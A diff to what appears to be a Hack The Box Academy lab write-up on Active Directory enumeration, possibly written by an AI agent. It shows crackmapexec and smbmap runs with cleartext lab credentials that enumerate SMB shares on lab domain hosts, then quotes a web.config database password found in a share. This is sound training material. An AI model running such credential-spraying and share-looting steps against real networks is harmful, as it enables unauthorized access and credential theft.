@@ -262,3 +262,110 @@ No admininstrator rights
 C:\Users\BR086>cd c:\Users\Administrator
 Access is denied.
 ```
+
+```
+┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data]
+└─$ crackmapexec smb MS01 SQL01 DC01 -u BR086 -p Welcome1 --shares
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [+] INLANEFREIGHT.LOCAL\BR086:Welcome1
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [+] Enumerated shares
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            Share           Permissions     Remark
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            -----           -----------     ------
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            ADMIN$                          Remote Admin
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            C$                              Default share
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            IPC$            READ            Remote IPC
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [+] Enumerated shares
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             Share           Permissions     Remark
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             -----           -----------     ------
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             ADMIN$                          Remote Admin
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             C$                              Default share
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             IPC$            READ            Remote IPC
+
+┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data]
+└─$ crackmapexec smb MS01 SQL01 DC01 -u AB920 -p weasal --shares
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [+] INLANEFREIGHT.LOCAL\AB920:weasal
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [+] INLANEFREIGHT.LOCAL\AB920:weasal
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             [+] Enumerated shares
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             Share           Permissions     Remark
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             -----           -----------     ------
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             ADMIN$                          Remote Admin
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             C$                              Default share
+SMB         MS01.INLANEFREIGHT.LOCAL 445    MS01             IPC$            READ            Remote IPC
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            [+] Enumerated shares
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            Share           Permissions     Remark
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            -----           -----------     ------
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            ADMIN$                          Remote Admin
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            C$                              Default share
+SMB         SQL01.INLANEFREIGHT.LOCAL 445    SQL01            IPC$            READ            Remote IPC
+```
+
+```
+└─$ crackmapexec mssql SQL01 -u BR086 -p Welcome1
+MSSQL       SQL01.INLANEFREIGHT.LOCAL 1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL)
+MSSQL       SQL01.INLANEFREIGHT.LOCAL 1433   SQL01            [-] INLANEFREIGHT.LOCAL\BR086:Welcome1 name 'logging' is not defined
+```
+
+**Bloodhound on BR086 didn't reveal any useful paths or privileges**
+
+![](../screenshots/BR086_bloodhound.png)
+
+It was interesting that there was no results for smb shares from DC01. Tried again using `smbmap` and `crackmapexec` but with IP for crackmapexec.
+
+```
+┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data]
+└─$ crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --shares
+SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1
+SMB         172.16.7.3      445    DC01             [+] Enumerated shares
+SMB         172.16.7.3      445    DC01             Share           Permissions     Remark
+SMB         172.16.7.3      445    DC01             -----           -----------     ------
+SMB         172.16.7.3      445    DC01             ADMIN$                          Remote Admin
+SMB         172.16.7.3      445    DC01             C$                              Default share
+SMB         172.16.7.3      445    DC01             Department Shares READ            Share for department users
+SMB         172.16.7.3      445    DC01             IPC$            READ            Remote IPC
+SMB         172.16.7.3      445    DC01             NETLOGON        READ            Logon server share
+SMB         172.16.7.3      445    DC01             SYSVOL          READ            Logon server share
+```
+
+```
+└─$ smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)
+
+[+] IP: 172.16.7.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        Department Shares                                       READ ONLY       Share for department users
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        SYSVOL                                                  READ ONLY       Logon server share
+[*] Closed 1 connections
+```
+
+It's revelating that there's actually smbshares to access. We should take note of this learning.
+
+Found creds in [web.config](./172.16.7.3-Department%20Shares_IT_Private_Development_web.config) from [enumerating SMB shares of DC01](./BR086_dc01_shares_recurs.log). 
+
+```
+       <connectionStrings>
+           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
+       </connectionStrings>
+```
